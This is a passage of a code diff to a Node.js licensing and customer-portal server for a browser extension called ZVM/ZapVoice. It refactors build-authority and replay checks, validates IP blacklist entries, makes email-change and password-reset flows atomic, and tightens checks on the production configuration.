-  if (!/^[A-Za-z0-9._:-]{8,96}$/.test(requestId) || !Number.isFinite(sentAtMs) || Math.abs(now - sentAtMs) > ZVM_SECURITY_CLOCK_SKEW_MS) return { ok:false, code:'SECURITY_REQUEST_STALE' };
-  zvmSecurityCleanupSeen(now);
-  if (consume) {
-    if (ZVM_SECURITY_SEEN.has(requestId)) return { ok:false, code:'SECURITY_REPLAY_REJECTED' };
-    ZVM_SECURITY_SEEN.set(requestId, now);
-  }
-  const recognized = zvmSecurityBuildRecognized(extensionVersion, buildFingerprint);
-  const allowUnrecognized = options.allowUnrecognized === true;
-  const requireRecognized = options.requireRecognized !== false;
-  if (ZVM_BUILD_ENFORCE && requireRecognized && !recognized && !allowUnrecognized) return { ok:false, code:'BUILD_NOT_ALLOWED', recognized:false, extensionVersion, extensionId, buildFingerprint };
-  return { ok:true, recognized, developmentAuthorized:(!recognized && allowUnrecognized), extensionVersion, extensionId, buildFingerprint, requestId };
-}
-async function zvmSecurityConsumeRequestIdShared(requestId, nowMs = Date.now(), deps = {}) {
+
+async function zvmSecurityConsumeRequestIdSharedImpl(requestId, nowMs = Date.now(), deps = {}) {
   const db = deps.db || await getMongoDb();
   const expiresAt = new Date(Number(nowMs) + ZVM_SECURITY_REQUEST_TTL_MS);
   try {
@@ -10316,18 +10428,35 @@ async function zvmSecurityConsumeRequestIdShared(requestId, nowMs = Date.now(), 
     return { ok: false, code: 'SECURITY_REPLAY_UNAVAILABLE' };
   }
 }
-async function zvmSecurityCheckClientShared(raw, options, deps = {}) {
-  const checked = zvmSecurityCheckClient(raw, false, options);
-  if (!checked.ok) return checked;
-  const consumed = await zvmSecurityConsumeRequestIdShared(checked.requestId, Date.now(), deps);
-  if (!consumed.ok) return { ...checked, ok: false, code: consumed.code };
-  return checked;
-}
-function zvmSecurityClientErrorStatus(code) {
-  if (code === 'BUILD_NOT_ALLOWED' || code === 'BUILD_REVOKED' || code === 'EXTENSION_ID_NOT_ALLOWED') return 403;
-  if (code === 'SECURITY_REPLAY_UNAVAILABLE') return 503;
-  return 400;
-}
+
+const ZVM_BUILD_AUTHORITY = createBuildAuthority({
+  securityProtocol: ZVM_SECURITY_PROTOCOL,
+  buildEnforce: ZVM_BUILD_ENFORCE,
+  legacyV3Allow: ZVM_LEGACY_V3_ALLOW,
+  extensionIds: ZVM_EXTENSION_IDS,
+  officialBuilds: ZVM_OFFICIAL_BUILDS,
+  deniedBuilds: ZVM_DENIED_BUILDS,
+  registryV2: ZVM_BUILD_REGISTRY_V2,
+  runtimeEnv: ZVM_RUNTIME_ENV,
+  devBuildAllow: ZVM_DEV_BUILD_ALLOW,
+  devBuildKeyHashes: ZVM_DEV_BUILD_KEY_HASHES,
+  devBuildDeviceHashes: ZVM_DEV_BUILD_DEVICE_HASHES,
+  clockSkewMs: ZVM_SECURITY_CLOCK_SKEW_MS,
+  requestTtlMs: ZVM_SECURITY_REQUEST_TTL_MS,
+}, {
+  consumeRequestIdShared: zvmSecurityConsumeRequestIdSharedImpl,
+});
+
+function legacyV3Allowed() { return ZVM_BUILD_AUTHORITY.legacyV3Allowed(); }
+function zvmSecurityBuildRecognized(version, fingerprint) { return ZVM_BUILD_AUTHORITY.buildRecognized(version, fingerprint); }
+function zvmSecurityBuildDenied(version, fingerprint) { return ZVM_BUILD_AUTHORITY.buildDenied(version, fingerprint); }
+function zvmSecurityStoredSessionAllowed(doc) { return ZVM_BUILD_AUTHORITY.storedSessionAllowed(doc); }
+function zvmSecurityStoredSessionDecision(doc) { return ZVM_BUILD_AUTHORITY.storedSessionDecision(doc); }
+function zvmSecurityCheckClient(raw, consume, options) { return ZVM_BUILD_AUTHORITY.checkClient(raw, { ...(options || {}), consume: consume === true }); }
+function zvmSecurityConsumeRequestIdShared(requestId, nowMs = Date.now(), deps = {}) { return ZVM_BUILD_AUTHORITY.consumeRequestIdShared(requestId, nowMs, deps); }
+function zvmSecurityCheckClientShared(raw, options, deps = {}) { return ZVM_BUILD_AUTHORITY.checkClientShared(raw, options, deps); }
+function zvmSecurityClientErrorStatus(code) { return ZVM_BUILD_AUTHORITY.clientErrorStatus(code); }
+function zvmSecurityDevBuildAllowed(keyCode, deviceId) { return ZVM_BUILD_AUTHORITY.devBuildAllowed(keyCode, deviceId); }
 
 function extensionPublicNotifications() {
   if (!EXTENSION_NOTIFICATIONS_JSON) return [];
@@ -10678,7 +10807,7 @@ async function handleRequest(req, res) {
   const ip  = getIp(req);
 
   // IP blacklist manual — bloqueio imediato antes de qualquer processamento
-  if (ipBlacklist.has(ip)) {
+  if (isIpBlacklisted(ip)) {
     res.writeHead(403, { 'Content-Type': 'text/plain', 'Server': 'ZVM' });
     res.end('403 Forbidden');
     return;
@@ -10891,7 +11020,7 @@ async function handleRequest(req, res) {
       const keyCodeForBuild = sanitizeId(body.authKey, 32);
       const deviceIdForBuild = String(body.deviceId || '').trim().slice(0, 160);
       const devBuildAllowed = zvmSecurityDevBuildAllowed(keyCodeForBuild, deviceIdForBuild);
-      const buildClient = await zvmSecurityCheckClientShared(body.clientSecurity, { allowUnrecognized:devBuildAllowed });
+      const buildClient = await zvmSecurityCheckClientShared(body.clientSecurity, { allowUnrecognized:devBuildAllowed, licenseKey:keyCodeForBuild });
       if (!buildClient.ok) { sendJson(res, { ok:false, errorCode:buildClient.code }, zvmSecurityClientErrorStatus(buildClient.code)); return; }
       const authorized = await authorizeExtensionKeySession(body);
       if (!authorized.ok) {
@@ -10905,10 +11034,7 @@ async function handleRequest(req, res) {
         licenseKeyCode: authorized.licenseKeyCode,
         phoneNumber: authorized.phoneNumber,
         deviceId: authorized.deviceId,
-        extensionVersion: buildClient.extensionVersion,
-        buildFingerprint: buildClient.buildFingerprint,
-        extensionId: buildClient.extensionId,
-        developmentAuthorized: buildClient.developmentAuthorized===true,
+        ...extensionSessionSecurityFields(buildClient),
         entitlementRevision: authorized.entitlement.entitlementRevision,
       });
       const keyRecord = keys[authorized.licenseKeyCode];
@@ -10938,9 +11064,11 @@ async function handleRequest(req, res) {
     }
     try {
       const body = await parseBody(req);
-      const buildClient = await zvmSecurityCheckClientShared(body.clientSecurity, {});
-      if (!buildClient.ok) { if (body && typeof body === 'object') delete body.password; sendJson(res, { ok:false, errorCode:buildClient.code }, zvmSecurityClientErrorStatus(buildClient.code)); return; }
-      if (ZVM_BUILD_ENFORCE && buildClient.recognized!==true && !ZVM_DEV_BUILD_ALLOW) { if (body && typeof body === 'object') delete body.password; sendJson(res, { ok:false, errorCode:'BUILD_NOT_ALLOWED' }, 403); return; }
+      let buildClient = await zvmSecurityCheckClientShared(body.clientSecurity, {});
+      const deferredDevV2 = !buildClient.ok && buildClient.code === 'DEV_BUILD_NOT_AUTHORIZED' &&
+        Number(body.clientSecurity?.protocol) === 2 && String(body.clientSecurity?.channel || '').toLowerCase() === 'dev';
+      if (!buildClient.ok && !deferredDevV2) { if (body && typeof body === 'object') delete body.password; sendJson(res, { ok:false, errorCode:buildClient.code }, zvmSecurityClientErrorStatus(buildClient.code)); return; }
+      if (!deferredDevV2 && ZVM_BUILD_ENFORCE && buildClient.recognized!==true && !ZVM_DEV_BUILD_ALLOW) { if (body && typeof body === 'object') delete body.password; sendJson(res, { ok:false, errorCode:'BUILD_NOT_ALLOWED' }, 403); return; }
       const db = await getMongoDb();
       const authenticated = await authenticateExtensionAccount(body, { db });
       // Reduz a vida da senha em memória após a verificação. Ela nunca é
@@ -10951,10 +11079,16 @@ async function handleRequest(req, res) {
         sendJson(res, errorBody, status);
         return;
       }
-      const accountDevAllowed = zvmSecurityDevBuildAllowed(authenticated.licenseKeyCode, body.deviceId);
-      if (ZVM_BUILD_ENFORCE && buildClient.recognized!==true && !accountDevAllowed) {
-        sendJson(res, { ok:false, errorCode:'BUILD_NOT_ALLOWED' }, 403);
-        return;
+      if (deferredDevV2) {
+        buildClient = await zvmSecurityCheckClientShared(body.clientSecurity, { licenseKey:authenticated.licenseKeyCode || '' });
+        if (!buildClient.ok) { sendJson(res, { ok:false, errorCode:buildClient.code }, zvmSecurityClientErrorStatus(buildClient.code)); return; }
+      } else if (Number(buildClient.securityProtocol || 1) === 1) {
+        const accountDevAllowed = zvmSecurityDevBuildAllowed(authenticated.licenseKeyCode, body.deviceId);
+        if (ZVM_BUILD_ENFORCE && buildClient.recognized!==true && !accountDevAllowed) {
+          sendJson(res, { ok:false, errorCode:'BUILD_NOT_ALLOWED' }, 403);
+          return;
+        }
+        if (buildClient.recognized !== true && accountDevAllowed) buildClient = { ...buildClient, developmentAuthorized:true };
       }
       const issued = await createExtensionSession({
         subject: authenticated.subject,
@@ -10963,10 +11097,7 @@ async function handleRequest(req, res) {
         licenseKeyCode: authenticated.licenseKeyCode,
         phoneNumber: body.phoneNumber,
         deviceId: body.deviceId,
-        extensionVersion: buildClient.extensionVersion,
-        buildFingerprint: buildClient.buildFingerprint,
-        extensionId: buildClient.extensionId,
-        developmentAuthorized: buildClient.recognized!==true && accountDevAllowed,
+        ...extensionSessionSecurityFields(buildClient),
         entitlementRevision: authenticated.entitlement.entitlementRevision,
       }, { db });
       db.collection('portal_users').updateOne(
@@ -10990,7 +11121,8 @@ async function handleRequest(req, res) {
     const token = getExtensionBearerToken(req);
     if (!token) { sendJson(res, { ok: false, errorCode: 'invalid_session' }, 401); return; }
     try {
-      const refreshed = await refreshExtensionSession(token);
+      const body = await parseBody(req);
+      const refreshed = await refreshExtensionSession(token, { clientSecurity:body?.clientSecurity || null, requireCurrentClientSecurity:true });
       if (!refreshed.ok) {
         const { status, ...errorBody } = refreshed;
         sendJson(res, errorBody, status);
@@ -11599,9 +11731,8 @@ async function handleRequest(req, res) {
     if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
     if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
     const _b = await parseBody(req);
-    const _ip = String(_b.ip || '').trim().slice(0, 45);
-    if (!_ip) { sendJson(res, { error: 'ip_required' }, 400); return; }
-    ipBlacklist.add(_ip);
+    const _ip = addIpBlacklistEntry(String(_b.ip || '').trim().slice(0, 80));
+    if (!_ip) { sendJson(res, { error: 'invalid_ip' }, 400); return; }
     await saveIpBlacklist();
     addAdminAuditLog({ actor: 'admin', action: 'ip_blacklist_add', keyCode: '-', label: '-', detail: _ip }).catch(()=>{});
     sendJson(res, { ok: true, ips: [...ipBlacklist] }); return;
@@ -11610,8 +11741,8 @@ async function handleRequest(req, res) {
     if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
     if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
     const _b = await parseBody(req);
-    const _ip = String(_b.ip || '').trim().slice(0, 45);
-    ipBlacklist.delete(_ip);
+    const _ip = removeIpBlacklistEntry(String(_b.ip || '').trim().slice(0, 80));
+    if (!_ip) { sendJson(res, { error: 'invalid_ip' }, 400); return; }
     await saveIpBlacklist();
     addAdminAuditLog({ actor: 'admin', action: 'ip_blacklist_remove', keyCode: '-', label: '-', detail: _ip }).catch(()=>{});
     sendJson(res, { ok: true, ips: [...ipBlacklist] }); return;
@@ -12466,12 +12597,30 @@ async function handleRequest(req, res) {
         if (!passOk) { sendHtml(res, renderStandalonePortalChangeEmail('Senha incorreta.', '', sess)); return; }
         const exists = await db.collection('portal_users').findOne({ _id: newemail });
         if (exists) { sendHtml(res, renderStandalonePortalChangeEmail('Este e-mail já está cadastrado.', '', sess)); return; }
-        const newUser = { ...user, _id: newemail };
-        await db.collection('portal_users').insertOne(newUser);
-        await db.collection('portal_users').deleteOne({ _id: sess.email });
-        // Revogar sessão atual
-        const _cookie = (req.headers.cookie||'').match(/zv_portal=([a-f0-9]+)/);
-        if (_cookie) delete portalSessions[_cookie[1]];
+        const operationId = crypto.randomBytes(16).toString('hex');
+        const claimed = await claimPortalEmailChange(db, sess.email, { operationId, targetEmail: newemail, startedAt: new Date() });
+        if (!claimed) { sendHtml(res, renderStandalonePortalChangeEmail('Uma alteração de e-mail já está em andamento. Tente novamente.', '', sess)); return; }
+        let targetCreated = false;
+        try {
+          const newUser = preparePortalUserForEmailChange(user, sess.email, newemail);
+          await db.collection('portal_users').insertOne(newUser);
+          targetCreated = true;
+          const finalized = await finalizePortalEmailChange(db, sess.email, operationId);
+          if (!finalized) {
+            await db.collection('portal_users').deleteOne({ _id: newemail }).catch(()=>{});
+            await releasePortalEmailChange(db, sess.email, operationId).catch(()=>{});
+            sendHtml(res, renderStandalonePortalChangeEmail('Erro temporário. Tente novamente.', '', sess)); return;
+          }
+        } catch (moveErr) {
+          if (targetCreated) await db.collection('portal_users').deleteOne({ _id: newemail }).catch(()=>{});
+          await releasePortalEmailChange(db, sess.email, operationId).catch(()=>{});
+          if (moveErr?.code === 11000) {
+            sendHtml(res, renderStandalonePortalChangeEmail('Este e-mail já está cadastrado.', '', sess)); return;
+          }
+          throw moveErr;
+        }
+        // Uma troca de identidade revoga todas as sessões da conta antiga.
+        revokePortalSessions(sess.email);
         clearSessionCookie(res, 'zv_portal');
         res.writeHead(302, { Location: '/cliente/login?msg=email_changed' }); res.end(); return;
       } catch(e) { console.error('[Portal] email change:', e.message); sendHtml(res, renderStandalonePortalChangeEmail('Erro interno. Tente novamente.', '', sess)); return; }
@@ -12556,13 +12705,14 @@ async function handleRequest(req, res) {
       if (pass !== pass2)  { sendHtml(res, renderStandalonePortalResetForm('As senhas não coincidem.', '', tk)); return; }
       try {
         const db      = await getMongoDb();
-        const { rec, matchedId } = await resolveResetToken(db, tk);
+        const { rec, matchedId } = await claimResetToken(db, tk, new Date());
         if (!rec) { sendHtml(res, renderStandalonePortalResetForm('Link expirado ou inválido. Solicite um novo.', '', '')); return; }
         const newPass = await hashNewPortalPassword(pass);
         await db.collection('portal_users').updateOne({ _id: rec.email }, { $set: newPass });
         // Reset de senha expulsa todas as sessoes existentes da conta.
         revokePortalSessions(rec.email);
-        // Uso único: apaga pelo mesmo _id que casou (hash ou, no caso legado, cru).
+        // Após o claim atômico, removemos o registro consumido. O consumedAt
+        // impede uma segunda requisição concorrente de avançar antes daqui.
         await db.collection('password_resets').deleteOne({ _id: matchedId });
         sendHtml(res, renderStandalonePortalResetForm('', 'Senha redefinida com sucesso!', '')); return;
       } catch(e) { sendHtml(res, renderStandalonePortalResetForm('Erro temporário.', '', tk)); return; }
@@ -12711,15 +12861,31 @@ async function gracefulShutdown(signal, exitCode = 0) {
   process.exit(exitCode);
 }
 function validateProductionSecurityConfig() {
-  if (!IS_PRODUCTION) return { ok: true, production: false };
+  const authorityState = {
+    ...ZVM_BUILD_AUTHORITY.describe(),
+    extensionIdCount: ZVM_EXTENSION_IDS.size,
+    devKeyHashCount: ZVM_DEV_BUILD_KEY_HASHES.size,
+    devDeviceHashCount: ZVM_DEV_BUILD_DEVICE_HASHES.size,
+    registryV2Error: !!ZVM_BUILD_REGISTRY_V2_ERROR,
+  };
+  const runtimeState = validateRuntimeSecurityConfig(process.env, authorityState, {
+    productionDbName: 'zapvoice',
+    requiredCrypto: [
+      {
+        enabled: ZVM_RUNTIME_ENV === 'production',
+        configured: portalTotpKeyRing().length > 0,
+        code: 'PORTAL_TOTP_CRYPTO_UNAVAILABLE',
+      },
+    ],
+  });
+
+  if (runtimeState.runtimeEnv !== 'production') {
+    return { ...runtimeState, production: false, legacyV3: legacyV3Allowed() };
+  }
+
   const errors = [];
-  // Durante a migração, o Render pode operar com enforcement desligado para não
-  // quebrar a ZapVoice V3. Quando o enforcement é ligado, a allowlist volta a ser
-  // mandatória e o comportamento permanece fail-closed para a nova ZVM.
-  if (ZVM_BUILD_ENFORCE && !ZVM_EXTENSION_IDS.size) errors.push('ZVM_EXTENSION_IDS_required');
   if (Buffer.byteLength(String(APP_SECRET || ''), 'utf8') < 32) errors.push('APP_SECRET_too_weak');
   if (PORTAL_TOTP_ENCRYPTION_KEY && !_portalTotpDecodeKey(PORTAL_TOTP_ENCRYPTION_KEY)) errors.push('PORTAL_TOTP_ENCRYPTION_KEY_invalid');
-  if (!portalTotpKeyRing().length) errors.push('PORTAL_TOTP_CRYPTO_UNAVAILABLE');
   if (WEBHOOK_URL && !parseSafeWebhookUrl(WEBHOOK_URL)) errors.push('WEBHOOK_URL_https_required');
   if (CAKTO_WEBHOOK_SECRET && Buffer.byteLength(String(CAKTO_WEBHOOK_SECRET), 'utf8') < 32) errors.push('CAKTO_WEBHOOK_SECRET_too_weak');
   if (CAKTO_WEBHOOK_SECRET) {
@@ -12728,10 +12894,6 @@ function validateProductionSecurityConfig() {
     for (const previous of String(CAKTO_RECOVERY_SECRET_PREVIOUS || '').split(',').map(v => v.trim()).filter(Boolean)) {
       if (Buffer.byteLength(previous, 'utf8') < 32) errors.push('CAKTO_RECOVERY_SECRET_PREVIOUS_too_weak');
     }
-    // OFFER_ID/PRODUCT_ID são pinning adicional quando disponíveis, não pré-
-    // requisito de boot. A instalação Cakto existente opera com checkout oficial
-    // e nomes comerciais canônicos; a integridade comercial ainda valida preço,
-    // moeda/status e, quando IDs forem configurados, exige correspondência exata.
   }
   if (errors.length) {
     const error = new Error(`PRODUCTION_SECURITY_CONFIG_INVALID:${errors.join(',')}`);
@@ -12739,8 +12901,14 @@ function validateProductionSecurityConfig() {
     error.problems = errors;
     throw error;
   }
-  return { ok: true, production: true, buildEnforcement: ZVM_BUILD_ENFORCE, legacyV3: legacyV3Allowed() };
+  return {
+    ...runtimeState,
+    production: true,
+    legacyV3: legacyV3Allowed(),
+    registryV2ActiveCount: authorityState.registryV2ActiveCount,
+  };
 }
+
 
 if (require.main === module) {
 process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
@@ -12756,11 +12924,13 @@ process.on('SIGINT',  () => gracefulShutdown('SIGINT'));
     serverReady = true;
     startCaktoWorker();
 
+    const buildAuthorityState = ZVM_BUILD_AUTHORITY.describe();
     console.log(
       `✅ ZVM Server ${ZVM_BUILD_ID} — porta ${PORT}\n` +
       `🍃 MongoDB: zapvoice.store | Chaves: ${Object.keys(keys).length} | Logs: ${logs.length}\n` +
       `🔐 HMAC: ${APP_SECRET ? 'ATIVO' : '⚠ INATIVO'} | 2FA: ${TOTP_SECRET ? 'ATIVO' : '⚠ INATIVO'} | TOTP crypto: ${portalTotpCryptoMode()} | Cakto: ${CAKTO_WEBHOOK_SECRET ? 'ATIVO' : '⚠ INATIVO'}\n` +
-      `🛡️ Build Authority: ${ZVM_BUILD_ENFORCE ? 'ATIVO' : 'DESATIVADO'} | Builds oficiais: ${Array.from(ZVM_OFFICIAL_BUILDS.values()).reduce((n,s)=>n+s.size,0)} | Dev build: ${ZVM_DEV_BUILD_ALLOW ? 'ATIVO' : 'DESATIVADO'} | Legacy V3: ${legacyV3Allowed() ? 'ATIVO' : 'INATIVO'}\n` +
+      `🛡️ Runtime: ${buildAuthorityState.runtimeEnv || 'não definido'} | Build Authority: ${buildAuthorityState.buildEnforce ? 'ATIVO' : 'DESATIVADO'} | Registry V2 active: ${buildAuthorityState.registryV2ActiveCount} | DEV bypass: ${buildAuthorityState.devBuildAllow ? 'ATIVO' : 'INATIVO'} | Legacy V3: ${buildAuthorityState.legacyV3 ? 'ATIVO' : 'INATIVO'}\n` +
+      `🧪 Local safe mode: ${ZVM_LOCAL_SAFE_MODE ? 'ATIVO — jobs autônomos desativados' : 'INATIVO'}\n` +
       // Rota admin derivada + usuário administrativo NÃO vão pro log de boot:
       // quem operou já tem essas duas informações a partir das próprias env
       // vars (APP_SECRET/ADMIN_USER) — reimprimi-las só cria mais um lugar
@@ -12840,13 +13010,14 @@ process.on('SIGINT',  () => gracefulShutdown('SIGINT'));
       _pingInterval.unref(); // Não bloqueia event loop no shutdown
     });
   } catch (e) {
-    console.error('❌ Falha ao iniciar:', e.message);
+    console.error('❌ Falha ao iniciar:', sanitizeStartupErrorMessage(e));
     process.exit(1);
   }
 })();
 }
 
 module.exports.__test = Object.freeze({
+  sanitizeStartupErrorMessage,
   keys,
   loadDb,
   _writeKeyToDbStrict,
@@ -12988,6 +13159,14 @@ module.exports.__test = Object.freeze({
   PASSWORD_ITERATIONS_CURRENT,
   hashResetToken,
   resolveResetToken,
+  claimResetToken,
+  claimPortalEmailChange,
+  releasePortalEmailChange,
+  finalizePortalEmailChange,
+  preparePortalUserForEmailChange,
+  portalTotpEncrypt,
+  portalTotpDecrypt,
+  csvCell,
   setSessionCookie,
   clearSessionCookie,
   isAdminSession,
@@ -13009,6 +13188,7 @@ module.exports.__test = Object.freeze({
   extensionLicenseIsUsable,
   buildExtensionEntitlement,
   extensionSessionSuccess,
+  extensionSessionSecurityFields,
   createExtensionSession,
   readExtensionSession,
   revokeExtensionSession,
@@ -13024,6 +13204,7 @@ module.exports.__test = Object.freeze({
   zvmSecurityBuildRecognized,
   zvmSecurityBuildDenied,
   zvmSecurityStoredSessionAllowed,
+  zvmSecurityStoredSessionDecision,
   zvmSecurityCheckClient,
   zvmSecurityCheckClientShared,
   zvmSecurityConsumeRequestIdShared,
@@ -13031,6 +13212,10 @@ module.exports.__test = Object.freeze({
   zvmSecurityDevBuildAllowed,
   resolveUsageKey,
   normalizeClientIp,
+  replaceIpBlacklist,
+  addIpBlacklistEntry,
+  removeIpBlacklistEntry,
+  isIpBlacklisted,
   isAllowedExtensionOrigin,
   getIp,
   checkRateLimit,
